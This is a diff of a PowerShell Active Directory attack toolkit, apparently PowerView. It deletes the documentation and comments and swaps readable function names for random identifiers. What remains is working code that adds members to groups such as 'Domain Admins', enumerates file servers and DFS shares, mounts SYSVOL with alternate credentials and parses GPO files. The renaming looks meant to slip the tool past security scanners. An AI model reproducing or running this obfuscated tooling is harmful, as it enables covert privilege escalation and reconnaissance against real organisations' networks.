-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
-specifying the group to add members to.
-
-.PARAMETER Members
-
-One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
-(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
-or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).
-
-.PARAMETER Domain
-
-Specifies the domain to use to search for user/group principals, defaults to the current domain.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'
-
-Adds harmj0y to 'Domain Admins' in the current domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
-
-Adds harmj0y to 'Domain Admins' in the current domain using the alternate credentials.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred
-
-Creates the 'andy' user with the specified description and password, using the specified
-alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember
-and the alternate credentials.
-
-.LINK
-
-http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
@@ -11653,14 +6856,14 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
         if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
         if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
 
-        $GroupContext = Get-PrincipalContext @ContextArguments
+        $GroupContext = X23WOD9H @ContextArguments
 
         if ($GroupContext) {
             try {
                 $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
             }
             catch {
-                Write-Warning "[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_"
+                Write-Warning "[OMR7GHE6] Error finding the group identity '$Identity' : $_"
             }
         }
     }
@@ -11670,7 +6873,7 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
             ForEach ($Member in $Members) {
                 if ($Member -match '.+\\.+') {
                     $ContextArguments['Identity'] = $Member
-                    $UserContext = Get-PrincipalContext @ContextArguments
+                    $UserContext = X23WOD9H @ContextArguments
                     if ($UserContext) {
                         $UserIdentity = $UserContext.Identity
                     }
@@ -11679,7 +6882,7 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
                     $UserContext = $GroupContext
                     $UserIdentity = $Member
                 }
-                Write-Verbose "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
+                Write-Verbose "[OMR7GHE6] Adding member '$Member' to group '$Identity'"
                 $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                 $Group.Members.Add($Member)
                 $Group.Save()
@@ -11689,64 +6892,8 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
 }
 
 
-function Remove-DomainGroupMember {
-<#
-.SYNOPSIS
+function LGFY20B5 {
 
-Removes a domain user (or group) from an existing domain group, assuming
-appropriate permissions to do so.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-PrincipalContext  
-
-.DESCRIPTION
-
-First binds to the specified domain context using Get-PrincipalContext.
-The bound domain context is then used to search for the specified -GroupIdentity,
-which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
-each entry in -Members, each member identity is similarly searched for and removed
-from the group.
-
-.PARAMETER Identity
-
-A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
-specifying the group to remove members from.
-
-.PARAMETER Members
-
-One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
-(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
-or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).
-
-.PARAMETER Domain
-
-Specifies the domain to use to search for user/group principals, defaults to the current domain.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'
-
-Removes harmj0y from 'Domain Admins' in the current domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
-
-Removes harmj0y from 'Domain Admins' in the current domain using the alternate credentials.
-
-.LINK
-
-http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
@@ -11777,14 +6924,14 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
         if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
         if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
 
-        $GroupContext = Get-PrincipalContext @ContextArguments
+        $GroupContext = X23WOD9H @ContextArguments
 
         if ($GroupContext) {
             try {
                 $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
             }
             catch {
-                Write-Warning "[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_"
+                Write-Warning "[LGFY20B5] Error finding the group identity '$Identity' : $_"
             }
         }
     }
@@ -11794,7 +6941,7 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
             ForEach ($Member in $Members) {
                 if ($Member -match '.+\\.+') {
                     $ContextArguments['Identity'] = $Member
-                    $UserContext = Get-PrincipalContext @ContextArguments
+                    $UserContext = X23WOD9H @ContextArguments
                     if ($UserContext) {
                         $UserIdentity = $UserContext.Identity
                     }
@@ -11803,7 +6950,7 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
                     $UserContext = $GroupContext
                     $UserIdentity = $Member
                 }
-                Write-Verbose "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
+                Write-Verbose "[LGFY20B5] Removing member '$Member' from group '$Identity'"
                 $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                 $Group.Members.Remove($Member)
                 $Group.Save()
@@ -11813,84 +6960,8 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
 }
 
 
-function Get-DomainFileServer {
-<#
-.SYNOPSIS
+function QIVRPO05 {
 
-Returns a list of servers likely functioning as file servers.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher  
-
-.DESCRIPTION
-
-Returns a list of likely fileservers by searching for all users in Active Directory
-with non-null homedirectory, scriptpath, or profilepath fields, and extracting/uniquifying
-the server names.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainFileServer
-
-Returns active file servers for the current domain.
-
-.EXAMPLE
-
-Get-DomainFileServer -Domain testing.local
-
-Returns active file servers for the 'testing.local' domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainFileServer -Credential $Cred
-
-.OUTPUTS
-
-String
-
-One or more strings representing file server names.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([String])]
@@ -11939,7 +7010,7 @@ One or more strings representing file server names.
 
     BEGIN {
         function Split-Path {
-            # short internal helper to split UNC server paths
+            
             Param([String]$Path)
 
             if ($Path -and ($Path.split('\\').Count -ge 3)) {
@@ -11967,95 +7038,21 @@ One or more strings representing file server names.
         if ($PSBoundParameters['Domain']) {
             ForEach ($TargetDomain in $Domain) {
                 $SearcherArguments['Domain'] = $TargetDomain
-                $UserSearcher = Get-DomainSearcher @SearcherArguments
-                # get all results w/o the pipeline and uniquify them (I know it's not pretty)
+                $UserSearcher = NJUXTHTL @SearcherArguments
+                
                 $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
             }
         }
         else {
-            $UserSearcher = Get-DomainSearcher @SearcherArguments
+            $UserSearcher = NJUXTHTL @SearcherArguments
             $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
         }
     }
 }
 
 
-function Get-DomainDFSShare {
-<#
-.SYNOPSIS
+function LDL959ST {
 
-Returns a list of all fault-tolerant distributed file systems
-for the current (or specified) domains.
-
-Author: Ben Campbell (@meatballs__)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher  
-
-.DESCRIPTION
-
-This function searches for all distributed file systems (either version
-1, 2, or both depending on -Version X) by searching for domain objects
-matching (objectClass=fTDfs) or (objectClass=msDFS-Linkv2), respectively
-The server data is parsed appropriately and returned.
-
-.PARAMETER Domain
-
-Specifies the domains to use for the query, defaults to the current domain.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainDFSShare
-
-Returns all distributed file system shares for the current domain.
-
-.EXAMPLE
-
-Get-DomainDFSShare -Domain testlab.local
-
-Returns all distributed file system shares for the 'testlab.local' domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainDFSShare -Credential $Cred
-
-.OUTPUTS
-
-System.Management.Automation.PSCustomObject
-
-A custom PSObject describing the distributed file systems.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -12124,7 +7121,7 @@ A custom PSObject describing the distributed file systems.
             $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
             $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
             $offset = 8
-            #https://msdn.microsoft.com/en-us/library/cc227147.aspx
+            
             $object_list = @()
             for($i=1; $i -le $blob_element_count; $i++){
                 $blob_name_size_start = $offset
@@ -12145,12 +7142,12 @@ A custom PSObject describing the distributed file systems.
                 switch -wildcard ($blob_name) {
                     "\siteroot" {  }
                     "\domainroot*" {
-                        # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...
-                        # DFSRootOrLinkIDBlob
+                        
+                        
                         $root_or_link_guid_start = 0
                         $root_or_link_guid_end = 15
                         $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
-                        $guid = New-Object Guid(,$root_or_link_guid) # should match $guid_str
+                        $guid = New-Object Guid(,$root_or_link_guid) 
                         $prefix_size_start = $root_or_link_guid_end + 1
                         $prefix_size_end = $prefix_size_start + 1
                         $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
@@ -12183,8 +7180,8 @@ A custom PSObject describing the distributed file systems.
                         }
                         $prefix_timestamp_start = $comment_end + 1
                         $prefix_timestamp_end = $prefix_timestamp_start + 7
-                        # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME
-                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] #dword lowDateTime #dword highdatetime
+                        
+                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] 
                         $state_timestamp_start = $prefix_timestamp_end + 1
                         $state_timestamp_end = $state_timestamp_start + 7
                         $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
@@ -12195,7 +7192,7 @@ A custom PSObject describing the distributed file systems.
                         $version_end = $version_start + 3
                         $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)
 
-                        # Parse rest of DFSNamespaceRootOrLinkBlob here
+                        
                         $dfs_targetlist_blob_size_start = $version_end + 1
                         $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                         $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)
@@ -12214,7 +7211,7 @@ A custom PSObject describing the distributed file systems.
                         $referral_ttl_end = $referral_ttl_start + 3
                         $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)
 
-                        #Parse DFSTargetListBlob
+                        
                         $target_count_start = 0
                         $target_count_end = $target_count_start + 3
                         $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
@@ -12226,7 +7223,7 @@ A custom PSObject describing the distributed file systems.
                             $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                             $target_time_stamp_start = $target_entry_size_end + 1
                             $target_time_stamp_end = $target_time_stamp_start + 7
-                            # FILETIME again or special if priority rank and priority class 0
+                            
                             $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                             $target_state_start = $target_time_stamp_end + 1
                             $target_state_end = $target_state_start + 3
@@ -12280,7 +7277,7 @@ A custom PSObject describing the distributed file systems.
             $servers
         }
 
-        function Get-DomainDFSShareV1 {
+        function LDL959STV1 {
             [CmdletBinding()]
             Param(
                 [String]
@@ -12309,7 +7306,7 @@ A custom PSObject describing the distributed file systems.
                 $Credential = [Management.Automation.PSCredential]::Empty
             )
 
-            $DFSsearcher = Get-DomainSearcher @PSBoundParameters
+            $DFSsearcher = NJUXTHTL @PSBoundParameters
 
             if ($DFSsearcher) {
                 $DFSshares = @()
@@ -12329,23 +7326,23 @@ A custom PSObject describing the distributed file systems.
                                 }
                             }
                             catch {
-                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
+                                Write-Verbose "[LDL959ST] LDL959STV1 error in parsing DFS share : $_"
                             }
                         }
                     }
                     if ($Results) {
                         try { $Results.dispose() }
                         catch {
-                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
+                            Write-Verbose "[LDL959ST] LDL959STV1 error disposing of the Results object: $_"
                         }
                     }
                     $DFSSearcher.dispose()
 
                     if ($pkt -and $pkt[0]) {
                         Parse-Pkt $pkt[0] | ForEach-Object {
-                            # If a folder doesn't have a redirection it will have a target like
-                            # \\null\TestNameSpace\folder\.DFSFolderLink so we do actually want to match
-                            # on 'null' rather than $Null
+                            
+                            
+                            
                             if ($_ -ne 'null') {
                                 New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                             }
@@ -12353,13 +7350,13 @@ A custom PSObject describing the distributed file systems.
                     }
                 }
                 catch {
-                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
+                    Write-Warning "[LDL959ST] LDL959STV1 error : $_"
                 }
                 $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
             }
         }
 
-        function Get-DomainDFSShareV2 {
+        function LDL959STV2 {
             [CmdletBinding()]
             Param(
                 [String]
@@ -12388,7 +7385,7 @@ A custom PSObject describing the distributed file systems.
                 $Credential = [Management.Automation.PSCredential]::Empty
             )
 
-            $DFSsearcher = Get-DomainSearcher @PSBoundParameters
+            $DFSsearcher = NJUXTHTL @PSBoundParameters
 
             if ($DFSsearcher) {
                 $DFSshares = @()
@@ -12411,20 +7408,20 @@ A custom PSObject describing the distributed file systems.
                                 }
                             }
                             catch {
-                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
+                                Write-Verbose "[LDL959ST] LDL959STV2 error in parsing target : $_"
                             }
                         }
                     }
                     if ($Results) {
                         try { $Results.dispose() }
                         catch {
-                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
+                            Write-Verbose "[LDL959ST] Error disposing of the Results object: $_"
                         }
                     }
                     $DFSSearcher.dispose()
                 }
                 catch {
-                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
+                    Write-Warning "[LDL959ST] LDL959STV2 error : $_"
                 }
                 $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
             }
@@ -12438,19 +7435,19 @@ A custom PSObject describing the distributed file systems.
             ForEach ($TargetDomain in $Domain) {
                 $SearcherArguments['Domain'] = $TargetDomain
                 if ($Version -match 'all|1') {
-                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
+                    $DFSshares += LDL959STV1 @SearcherArguments
                 }
                 if ($Version -match 'all|2') {
-                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
+                    $DFSshares += LDL959STV2 @SearcherArguments
                 }
             }
         }
         else {
             if ($Version -match 'all|1') {
-                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
+                $DFSshares += LDL959STV1 @SearcherArguments
             }
             if ($Version -match 'all|2') {
-                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
+                $DFSshares += LDL959STV2 @SearcherArguments
             }
         }
 
@@ -12459,69 +7456,14 @@ A custom PSObject describing the distributed file systems.
 }
 
 
-########################################################
-#
-# GPO related functions.
-#
-########################################################
 
-function Get-GptTmpl {
-<#
-.SYNOPSIS
 
-Helper to parse a GptTmpl.inf policy file path into a hashtable.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, Get-IniContent  
 
-.DESCRIPTION
 
-Parses a GptTmpl.inf into a custom hashtable using Get-IniContent. If a
-GPO object is passed, GPOPATH\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
-is constructed and assumed to be the parse target. If -Credential is passed,
-Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
-the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.
 
-.PARAMETER GptTmplPath
+function W8HZ4RVI {
 
-Specifies the GptTmpl.inf file path name to parse.
-
-.PARAMETER OutputObject
-
-Switch. Output a custom PSObject instead of a hashtable.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system.
-
-.EXAMPLE
-
-Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
-
-Parse the default domain policy .inf for dev.testlab.local
-
-.EXAMPLE
-
-Get-DomainGPO testing | Get-GptTmpl
-
-Parse the GptTmpl.inf policy for the GPO with display name of 'testing'.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-GptTmpl -Credential $Cred -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
-
-Parse the default domain policy .inf for dev.testlab.local using alternate credentials.
-
-.OUTPUTS
-
-Hashtable
-
-Ouputs a hashtable representing the parsed GptTmpl.inf file.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([Hashtable])]
@@ -12549,8 +7491,8 @@ Ouputs a hashtable representing the parsed GptTmpl.inf file.
             if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                 $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                 if (-not $MappedPaths[$SysVolPath]) {
-                    # map IPC$ to this computer if it's not already
-                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
+                    
+                    MKK4QQPC -Path $SysVolPath -Credential $Credential
                     $MappedPaths[$SysVolPath] = $True
                 }
             }
@@ -12560,17 +7502,17 @@ Ouputs a hashtable representing the parsed GptTmpl.inf file.
                 $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
             }
 
-            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"
+            Write-Verbose "[W8HZ4RVI] Parsing GptTmplPath: $TargetGptTmplPath"
 
             if ($PSBoundParameters['OutputObject']) {
-                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
+                $Contents = 1OXAJ540 -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                 if ($Contents) {
                     $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
                     $Contents
                 }
             }
             else {
-                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
+                $Contents = 1OXAJ540 -Path $TargetGptTmplPath -ErrorAction Stop
                 if ($Contents) {
                     $Contents['Path'] = $TargetGptTmplPath
                     $Contents
@@ -12578,46 +7520,19 @@ Ouputs a hashtable representing the parsed GptTmpl.inf file.
             }
         }
         catch {
-            Write-Verbose "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
+            Write-Verbose "[W8HZ4RVI] Error parsing $TargetGptTmplPath : $_"
         }
     }
 
     END {
-        # remove the SYSVOL mappings
-        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
+        
+        $MappedPaths.Keys | ForEach-Object { TUGT2IL3 -Path $_ }
     }
 }
 
 
-function Get-GroupsXML {
-<#
-.SYNOPSIS
+function JZQ8NM8D {
 
-Helper to parse a groups.xml file path into a custom object.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertTo-SID  
-
-.DESCRIPTION
-
-Parses a groups.xml into a custom object. If -Credential is passed,
-Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
-the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.
-
-.PARAMETER GroupsXMLpath
-
-Specifies the groups.xml file path name to parse.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system.
-
-.OUTPUTS
-
-PowerView.GroupsXML
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.GroupsXML')]
@@ -12642,20 +7557,20 @@ PowerView.GroupsXML
             if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                 $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                 if (-not $MappedPaths[$SysVolPath]) {
-                    # map IPC$ to this computer if it's not already
-                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
+                    
+                    MKK4QQPC -Path $SysVolPath -Credential $Credential
                     $MappedPaths[$SysVolPath] = $True
                 }
             }
 
             [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop
 
-            # process all group properties in the XML
+            
             $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
 
                 $Groupname = $_.Properties.groupName
 
-                # extract the localgroup sid for memberof
+                
                 $GroupSID = $_.Properties.groupSid
                 if (-not $GroupSID) {
                     if ($Groupname -match 'Administrators') {
@@ -12677,14 +7592,14 @@ PowerView.GroupsXML
                     }
                 }
 
-                # extract out members added to this group
+                
                 $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                     if ($_.sid) { $_.sid }
                     else { $_.name }
                 }
 
                 if ($Members) {
-                    # extract out any/all filters...I hate you GPP
+                    
                     if ($_.filters) {
                         $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                             New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
@@ -12709,143 +7624,19 @@ PowerView.GroupsXML
             }
         }
         catch {
-            Write-Verbose "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
+            Write-Verbose "[JZQ8NM8D] Error parsing $TargetGroupsXMLPath : $_"
         }
     }
 
     END {
-        # remove the SYSVOL mappings
-        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
+        
+        $MappedPaths.Keys | ForEach-Object { TUGT2IL3 -Path $_ }
     }
 }
 
 
-function Get-DomainGPO {
-<#
-.SYNOPSIS
+function 5I3AJMSK {
 
-Return all GPOs or specific GPO objects in AD.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Get-DomainComputer, Get-DomainUser, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, Convert-LDAPProperty  
-
-.DESCRIPTION
-
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties samaccountname,usnchanged,...". By default, all GPO objects for
-the current domain are returned. To enumerate all GPOs that are applied to
-a particular machine, use -ComputerName X.
-
-.PARAMETER Identity
-
-A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
-GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.
-
-.PARAMETER ComputerIdentity
-
-Return all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.).
-
-.PARAMETER UserIdentity
-
-Return all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.).
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Raw
-
